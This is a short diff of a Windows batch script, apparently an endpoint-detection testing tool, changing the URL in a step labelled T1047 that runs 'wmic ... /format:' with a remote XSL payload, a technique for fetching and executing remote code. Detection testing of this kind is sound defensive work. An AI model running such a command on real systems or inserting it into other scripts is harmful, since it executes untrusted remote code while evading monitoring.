@@ -194,9 +194,9 @@ echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe 
 timeout 5
 
 echo %time% %date% [+] T1047 - Testing wmic download
-start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
+start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl"
 echo Execution Finished at %time% %date%
-echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
+echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl"
 
 timeout 5
 
